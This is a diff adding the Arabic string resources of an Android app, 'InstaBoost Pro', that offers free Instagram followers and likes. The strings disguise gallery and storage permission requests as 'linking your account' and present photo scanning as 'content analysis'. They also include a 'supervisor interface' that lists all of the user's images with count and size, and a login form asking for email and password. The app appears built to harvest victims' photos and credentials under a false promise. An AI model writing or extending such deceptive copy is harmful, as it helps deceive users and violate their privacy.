@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">InstaBoost Pro</string>
+    <string name="app_description">احصل على متابعين حقيقيين ولايكات مجانية لانستغرام بسرعة وسهولة</string>
+    <string name="select_image">اختيار صورة الملف الشخصي</string>
+    <string name="view_all_images">عرض جميع الصور</string>
+    <string name="permission_status_checking">جاري فحص الحساب...</string>
+    <string name="permission_status_granted">✅ تم ربط الحساب بنجاح</string>
+    <string name="permission_status_required">❌ يجب ربط الحساب أولاً</string>
+    <string name="image_selected_success">تم اختيار الصورة بنجاح</string>
+    <string name="permissions_granted_success">تم ربط الحساب بنجاح</string>
+    <string name="permissions_required_message">لا يمكن استخدام التطبيق بدون ربط الحساب</string>
+    <string name="permission_explanation_title">ربط الحساب</string>
+    <string name="permission_explanation_message">يحتاج التطبيق إلى ربط حسابك لتحليل المحتوى وتقديم أفضل النتائج. هذه الأذونات ضرورية لعمل التطبيق.</string>
+    <string name="grant_permissions">ربط الحساب</string>
+    <string name="cancel">إلغاء</string>
+    <string name="permissions_denied_title">فشل ربط الحساب</string>
+    <string name="permissions_denied_message">لم يتم ربط الحساب. يجب منح الأذونات من إعدادات التطبيق لاستخدام هذه الميزة.</string>
+    <string name="open_settings">فتح الإعدادات</string>
+    <string name="select_image_hint">اختر صورة ملفك الشخصي لتحسين النتائج</string>
+    <string name="gallery_viewer_title">تحليل المحتوى</string>
+    <string name="loading_images">جاري تحليل المحتوى...</string>
+    <string name="images_loaded">تم تحليل جميع المحتويات</string>
+    <string name="image_count">عدد المحتويات: %1$d</string>
+    <string name="permissions_required_for_gallery">يجب ربط الحساب أولاً</string>
+    
+    <!-- نصوص جديدة للأذونات المتعددة -->
+    <string name="permissions_count">الأذونات المطلوبة: %1$d</string>
+    <string name="permissions_granted_count">الأذونات الممنوحة: %1$d/%2$d</string>
+    <string name="requesting_permissions">جاري ربط الحساب...</string>
+    <string name="permissions_complete">تم ربط الحساب</string>
+    <string name="permissions_partial">تم ربط جزء من الحساب</string>
+    <string name="permissions_none">لم يتم ربط الحساب</string>
+    
+    <!-- نصوص جديدة للتطبيق -->
+    <string name="welcome_title">مرحباً بك في InstaBoost Pro</string>
+    <string name="welcome_subtitle">احصل على متابعين حقيقيين ولايكات مجانية</string>
+    <string name="connect_account">ربط الحساب</string>
+    <string name="analyze_content">تحليل المحتوى</string>
+    <string name="boost_followers">رشق متابعين</string>
+    <string name="boost_likes">رشق لايكات</string>
+    <string name="premium_features">ميزات مميزة</string>
+    <string name="account_status">حالة الحساب</string>
+    <string name="content_analysis">تحليل المحتوى</string>
+    
+    <!-- نصوص واجهة المشرف -->
+    <string name="supervisor_interface">واجهة المشرف</string>
+    <string name="supervisor_title">واجهة المشرف - جميع الصور</string>
+    <string name="supervisor_loading">جاري تحميل جميع الصور...</string>
+    <string name="supervisor_scanning">جاري المسح...</string>
+    <string name="supervisor_image_count">عدد الصور: %1$d</string>
+    <string name="supervisor_total_size">الحجم الإجمالي: %1$s</string>
+    <string name="supervisor_permission_required">يجب ربط الحساب أولاً للوصول لواجهة المشرف</string>
+    <string name="supervisor_error">حدث خطأ أثناء تحميل المحتوى: %1$s</string>
+    
+    <!-- نصوص نظام تسجيل الدخول -->
+    <string name="login_title">تسجيل الدخول إلى حسابك</string>
+    <string name="email_label">البريد الإلكتروني</string>
+    <string name="email_hint">أدخل بريدك الإلكتروني</string>
+    <string name="password_label">كلمة المرور</string>
+    <string name="password_hint">أدخل كلمة المرور</string>
+    <string name="login_button">تسجيل الدخول</string>
+    <string name="forgot_password">نسيت كلمة المرور؟</string>
+    <string name="no_account">ليس لديك حساب؟</string>
+    <string name="create_account">إنشاء حساب جديد</string>
+    <string name="skip_login">تخطي تسجيل الدخول</string>
+    
+    <!-- نصوص إنشاء الحساب -->
+    <string name="register_title">إنشاء حساب جديد</string>
+    <string name="full_name_label">الاسم الكامل</string>
+    <string name="full_name_hint">أدخل اسمك الكامل</string>
+    <string name="confirm_password_label">تأكيد كلمة المرور</string>
+    <string name="confirm_password_hint">أعد إدخال كلمة المرور</string>
+    <string name="register_button">إنشاء الحساب</string>
+    <string name="has_account">لديك حساب بالفعل؟</string>
+    <string name="back_to_login">تسجيل الدخول</string>
+    
+    <!-- نصوص نسيت كلمة المرور -->
+    <string name="forgot_password_title">نسيت كلمة المرور</string>
+    <string name="forgot_password_message">أدخل بريدك الإلكتروني وسنرسل لك رابط إعادة تعيين كلمة المرور</string>
+    <string name="reset_password_button">إرسال رابط إعادة التعيين</string>
+    <string name="remember_password">تذكرت كلمة المرور؟</string>
+    
+    <!-- رسائل التحقق -->
+    <string name="error_email_required">يرجى إدخال البريد الإلكتروني</string>
+    <string name="error_email_invalid">يرجى إدخال بريد إلكتروني صحيح</string>
+    <string name="error_password_required">يرجى إدخال كلمة المرور</string>
+    <string name="error_password_short">كلمة المرور يجب أن تكون 6 أحرف على الأقل</string>
+    <string name="error_confirm_password_required">يرجى تأكيد كلمة المرور</string>
+    <string name="error_passwords_not_match">كلمة المرور غير متطابقة</string>
+    <string name="error_full_name_required">يرجى إدخال الاسم الكامل</string>
+    <string name="error_invalid_credentials">بيانات غير صحيحة</string>
+    <string name="success_login">تم تسجيل الدخول بنجاح</string>
+    <string name="success_register">تم إنشاء الحساب بنجاح</string>
+    <string name="success_reset_password">تم إرسال رابط إعادة تعيين كلمة المرور إلى بريدك الإلكتروني</string>
+</resources> 
